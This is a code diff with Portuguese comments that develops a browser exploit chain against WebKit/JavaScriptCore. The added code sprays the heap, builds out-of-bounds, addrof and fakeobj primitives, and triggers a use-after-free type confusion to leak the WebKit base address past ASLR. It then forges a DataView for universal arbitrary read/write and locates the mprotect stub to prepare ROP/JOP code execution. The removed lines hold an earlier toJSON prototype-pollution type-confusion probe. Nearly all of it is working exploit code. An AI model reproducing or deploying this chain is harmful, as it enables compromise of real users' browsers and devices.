+        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
+        const sprayStartTime = performance.now();
+        const SPRAY_COUNT = 500000; // Aumentado para 500.000 objetos
+        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            // Variar tamanhos para preencher diferentes "buracos" no heap
+            const dataSize = 50 + (i % 50); // De 50 a 99 elementos
+            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
+        }
+        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
+        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
+        const oobSetupStartTime = performance.now();
+        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
+        await triggerOOB_primitive({ force_reinit: true });
+
+        const oob_data_view = getOOBDataView();
+        if (!oob_data_view) {
+            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // Inicializar addrof_core e fakeobj_core
+        initCoreAddrofFakeobjPrimitives();
+        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
+
+
+        // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---
+        logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---", "subtest");
+        
+        let leaked_jsvalue_from_uaf_double = 0; 
+
+        try {
+            const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM);
+
+            // --- FASE 5 do UAF original: Encontrar a referência corrompida e extrair os ponteiros ---
+            if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
+                 logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
+                 throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
+            }
+
+            // Tentar ler múltiplas vezes para garantir que o valor seja estável
+            let attempts = 5;
+            for(let i = 0; i < attempts; i++) {
+                leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento do Float64Array sobreposto
+                if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
+                     logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}`, "leak");
+                     break; // Se encontrou um valor que parece um ponteiro, sai
+                }
+                await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre as tentativas
+            }
+
+
+            if (typeof leaked_jsvalue_from_uaf_double !== 'number' || isNaN(leaked_jsvalue_from_uaf_double) || leaked_jsvalue_from_uaf_double === 0) {
+                 throw new Error(`Ponteiro vazado do UAF é inválido (double). Valor: ${leaked_jsvalue_from_uaf_double}. Provável falha de reocupação do heap.`);
+            }
+            logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");
+
+            // Untag o ponteiro vazado (lógica do addrof_core)
+            let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
+            const original_high = untagged_uaf_addr.high();
+            const OBJECT_PTR_TAG_HIGH = 0x402a0000; // Tag comum para ponteiros de objetos em doubles.
+            const untagged_high = original_high & 0x0000FFFF;
+
+            let wasTagged = false;
+            if ((original_high & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) { // Verifica se tem o high tag esperado
+                untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
+                logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag 0x402a): ${untagged_uaf_addr.toString(true)}`, "leak");
+                wasTagged = true;
+            } else {
+                logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high.toString(16)}). NENHUM untagging aplicado.`, "warn");
+            }
+            
+            // O 'untagged_uaf_addr' é agora o endereço do ponteiro da Structure do DataView pulverizado.
+            // Para obter a base da biblioteca WebKit, subtraímos o offset do vtable.
+            // O offset do vtable já está em formato hexadecimal na config, então usaremos parseInt
+            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+            
+            webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64); 
+            
+            // Verificação da validade da base WebKit
+            // Uma base válida deve ter os 12 bits menos significativos (os 3 últimos dígitos hex) como zero,
+            // ou seja, ser alinhada a 0x1000. Também não pode ser zero.
+            if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+                throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
+            }
+            logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");
+            
+            // Fazer um pequeno dump para confirmar que a base WebKit está correta (lendo um gadget conhecido)
+            const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+            const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
+            logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
+            const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4, logFn); // Usando a arb_read LOCAL
+            
+            if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) { // Uma verificação mais robusta
+                logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+            } else {
+                 logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "warn");
+                 // Se o gadget não puder ser lido, a arb_read local ainda pode estar limitada.
+                 // Mas, como UAF/TC foi bem-sucedido, prosseguimos para a universal R/W.
+            }
+
+        } catch (e_uaf_leak) {
+            logFn(`[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: ${e_uaf_leak.message}\n${e_uaf_leak.stack || ''}`, "critical");
+            throw new Error("Vazamento de ASLR via UAF/TC falhou, abortando exploração.");
+        }
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
+        // Este bloco só será executado se o vazamento de ASLR UAF/TC for bem-sucedido.
+        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
+
+        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
+        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
+        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
+
+        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
+        let universalRwSuccess = false;
+
+        for (const candidate_m_mode of mModeCandidates) {
+            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
+            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
+                logFn,
+                pauseFn,
+                JSC_OFFSETS_PARAM,
+                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
+                candidate_m_mode
+            );
+            if (universalRwSuccess) {
+                found_m_mode = candidate_m_mode;
+                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
+                break;
+            } else {
+                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
+                await pauseFn(LOCAL_SHORT_PAUSE); // Pausa menor entre as tentativas de m_mode
+            }
+        }
+
+        if (!universalRwSuccess) {
+            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
+        }
+        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        const dumpTargetUint8Array = new Uint8Array(0x100);
+        hold_objects.push(dumpTargetUint8Array);
+        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
+        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
+        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
+        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
+
+        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
+        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
+        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
+        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
+            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
+        } else {
+             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+        }
+
+        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
+        const rwTestPostLeakStartTime = performance.now();
+
+        const test_obj_post_leak = global_spray_objects[50000]; // Escolher um objeto mais distante para teste
+        hold_objects.push(test_obj_post_leak);
+        logFn(`Objeto de teste escolhido do spray (índice 50000) para teste pós-vazamento.`, "info");
+
+        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
+        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
+
+        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
+        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
+            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
+        }
+
+        const original_val_prop = test_obj_post_leak.val1;
+        logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');
+
+        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
+        await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pausa muito curta
+        const read_back_val_prop = faked_obj_for_post_leak_test.val1;
+
+        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
+            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
+        } else {
+            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
+            throw new Error("R/W verification post-ASLR leak failed.");
+        }
+
+        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
+
+        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
+        let resistanceSuccessCount_post_leak = 0;
+        const numResistanceTests = 10; // Aumentado para 10 testes
+        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
+
+        for (let i = 0; i < numResistanceTests; i++) {
+            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
+            try {
+                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
+                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);
+
+                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
+                    resistanceSuccessCount_post_leak++;
+                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
+                } else {
+                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
+                }
+            } catch (resErr) {
+                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
+            }
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa
+        }
+        if (resistanceSuccessCount_post_leak === numResistanceTests) {
+            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
+        } else {
+            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
+        }
+        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
+
+
+        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
+        final_result = {
+            success: true,
+            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
+            details: {
+                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
+                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
+                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
+            }
         };
 
-        const ppKey_TC = 'toJSON';
-        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
-        Object.defineProperty(Object.prototype, ppKey_TC, {
-            value: toJSON_ProbeForSelfTest,
-            writable: true, configurable: true, enumerable: false
-        });
-        pollutionApplied = true;
-        currentLog(`            (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);
-
-        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
-        currentLog(`            (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST);
-        currentLog(`            (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);
-
-        if (local_probe_details_for_selftest && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
-            currentLog(`    (TC SelfTest) SUCESSO (ou SUCESSO PARCIAL): Confusão de tipo detectada! 'this' é [object Object]. (is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref})`, "vuln", FNAME_TEST);
-            tcPhaseSuccess = true;
-        } else {
-            let detailsMsg = local_probe_details_for_selftest ? `is_victim_direct_ref=${local_probe_details_for_selftest.is_victim_direct_ref}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
-            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado tipo [object Object].`, "error", FNAME_TEST);
-        }
     } catch (e) {
-        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
+        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
+        final_result.success = false;
+        logFn(final_result.message, "critical");
     } finally {
-        if (pollutionApplied) {
-            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_TC, originalToJSONDescriptor);
-            else delete Object.prototype[ppKey_TC];
-            currentLog(`            (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
-            pollutionApplied = false;
-            originalToJSONDescriptor = null;
-        }
-        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa o ambiente OOB após o teste de TC
+        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
+        // Limpar objetos mantidos em hold_objects e global_spray_objects
+        global_spray_objects = [];
+        hold_objects = [];
+
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
 
-    if (!tcPhaseSuccess) {
-        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
-    } else {
-        await PAUSE(200);
-        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
-        let memoryControlPhaseSuccess = false;
-        try {
-            if (!isOOBReady()) {
-                currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
-                await triggerOOB_primitive({ force_reinit: true });
-                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
-            }
-            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
-            const OFFSET_M_MODE_TARGET = OOB_DV_M_MODE_OFFSET;
-
-            const PLANT_M_LENGTH = 0xBABEFACE;
-            const PLANT_M_MODE = 0x00000001;
-
-            currentLog(`    (MC) Configurando m_length e m_mode...`, 'info', FNAME_TEST);
-            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4);
-            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);
-            currentLog(`        m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}) para ${toHex(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
-            currentLog(`        m_mode (@${toHex(OFFSET_M_MODE_TARGET)}) para ${toHex(PLANT_M_MODE)}`, 'info', FNAME_TEST);
-
-            currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
-            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4);
-            const read_m_mode_val = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);
-
-            currentLog(`        Lido m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}): ${toHex(read_m_length_val)}`, "leak", FNAME_TEST);
-            currentLog(`        Lido m_mode    (@${toHex(OFFSET_M_MODE_TARGET)}): ${toHex(read_m_mode_val)}`, "leak", FNAME_TEST);
-
-            if (read_m_length_val === PLANT_M_LENGTH && read_m_mode_val === PLANT_M_MODE) {
-                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
-                memoryControlPhaseSuccess = true;
-            } else {
-                if (read_m_length_val !== PLANT_M_LENGTH) {
-                    currentLog(`    (MC) FALHA: m_length lido (${toHex(read_m_length_val)}) não corresponde ao plantado (${toHex(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
-                }
-                if (read_m_mode_val !== PLANT_M_MODE) {
-                    currentLog(`    (MC) FALHA: m_mode lido (${toHex(read_m_mode_val)}) não corresponde ao plantado (${toHex(PLANT_M_MODE)}).`, "error", FNAME_TEST);
-                }
-            }
-        } catch (e) {
-            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
-        } finally {
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa o ambiente OOB após o teste de controle de memória
-        }
-        if (tcPhaseSuccess && memoryControlPhaseSuccess) {
-            overallSuccess = true;
-        }
+    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
+    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
+    if (final_result.details) {
+        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
     }
 
-    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
-    return overallSuccess;
-}
-
-let _targetObjectForAddrofProbe_core_internal_v31_7 = null;
-let _heisenbugConfirmedByProbe_core_internal_v31_7 = false;
-
-function _toJSONProbeForAddrofInCoreInternal_v31_7() {
-    let currentThisType = Object.prototype.toString.call(this);
-    if (currentThisType === '[object Object]') {
-        _heisenbugConfirmedByProbe_core_internal_v31_7 = true;
-        if (_targetObjectForAddrofProbe_core_internal_v31_7) {
-            try { this[0] = _targetObjectForAddrofProbe_core_internal_v31_7; } catch (e_write) {
-                log(`[CoreAddrofProbeInternal_v31_7] Erro ao tentar this[0] = target: ${e_write.message}`, 'warn');
-            }
-        }
-    } else { _heisenbugConfirmedByProbe_core_internal_v31_7 = false; }
-    return { core_addrof_probe_executed: true, type_seen: currentThisType };
-}
-
-export async function attemptAddrofUsingCoreHeisenbug(targetObject) {
-    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
-    log(`[${FNAME_FUNC}] AVISO: Primitiva addrof (Heisenbug) é conhecida por falhar no ambiente atual. Tentando (v31.13)...`, "warn", FNAME_FUNC);
-    _targetObjectForAddrofProbe_core_internal_v31_7 = targetObject;
-    _heisenbugConfirmedByProbe_core_internal_v31_7 = false;
-    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado.", leaked_address_as_double: NaN, leaked_address_as_int64: null };
-    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
-    let pollutedByCoreAddrof = false;
-    try {
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Ambiente OOB não pôde ser inicializado para Addrof.");
-        }
-        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
-        await PAUSE(100);
-        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
-        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
-        const fillPatternForAddrof = 0.445566778812345;
-        float_view_on_confused_ab.fill(fillPatternForAddrof);
-
-        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCoreInternal_v31_7, writable: true, configurable: true, enumerable: false });
-        pollutedByCoreAddrof = true;
-        JSON.stringify(confused_ab_candidate);
-
-        if (_heisenbugConfirmedByProbe_core_internal_v31_7) {
-            const val_double = float_view_on_confused_ab[0];
-            addrof_result_internal.leaked_address_as_double = val_double;
-            log(`[${FNAME_FUNC}] Heisenbug confirmada. Valor lido como double: ${val_double} (Hex: ${toHex(new Float64Array([val_double]).buffer, 64)})`, 'leak');
-
-            if (val_double === fillPatternForAddrof) {
-                addrof_result_internal.message = "Heisenbug ocorreu, mas valor no buffer não foi alterado (ainda é o fillPattern). Addrof falhou.";
-            } else {
-                const db_conv_buf = new ArrayBuffer(8);
-                new Float64Array(db_conv_buf)[0] = val_double;
-                const dv_conv_i = new Uint32Array(db_conv_buf);
-                const potential_addr = new AdvancedInt64(dv_conv_i[0], dv_conv_i[1]);
-                addrof_result_internal.leaked_address_as_int64 = potential_addr.toString(true);
-                log(`[${FNAME_FUNC}] Convertido para Int64: ${toHexHelper(potential_addr)}`, 'leak');
-
-                if (!(potential_addr.equals(AdvancedInt64.Zero)) &&
-                    !(potential_addr.equals(AdvancedInt64.NaNValue)) &&
-                    val_double !== 0
-                ) {
-                    addrof_result_internal.success = true;
-                    addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido. Verifique o valor.";
-                } else {
-                    log(`[${FNAME_FUNC}] AVISO: AdvancedInt64.NaNValue é 0x${AdvancedInt64.NaNValue.high().toString(16)}_${AdvancedInt64.NaNValue.low().toString(16)}`, 'debug');
-                    addrof_result_internal.message = `Heisenbug ocorreu, mas valor lido (${toHexHelper(potential_addr)}) não parece endereço válido.`;
-                }
-            }
-        } else {
-            addrof_result_internal.message = "Heisenbug não foi confirmada pela sonda.";
-        }
-    } catch (e) {
-        addrof_result_internal.message = `Erro crítico em Addrof: ${e.message}`;
-        log(`[${FNAME_FUNC}] Exception: ${e.message}`, 'critical');
-    } finally {
-        if (pollutedByCoreAddrof) {
-            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
-            else delete Object.prototype.toJSON;
-        }
-        _targetObjectForAddrofProbe_core_internal_v31_7 = null;
-        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa o ambiente OOB após o teste Addrof Heisenbug
-    }
-    log(`[${FNAME_FUNC}] Resultado: ${JSON.stringify(addrof_result_internal)}`, addrof_result_internal.success ? 'good' : 'warn');
-    return addrof_result_internal;
-}
-
-export function getOOBDataView() {
-    return oob_dataview_real;
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
+        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
+        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
+        oob_value_of_best_result: 'N/A (UAF Strategy)',
+        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
+    };
 }
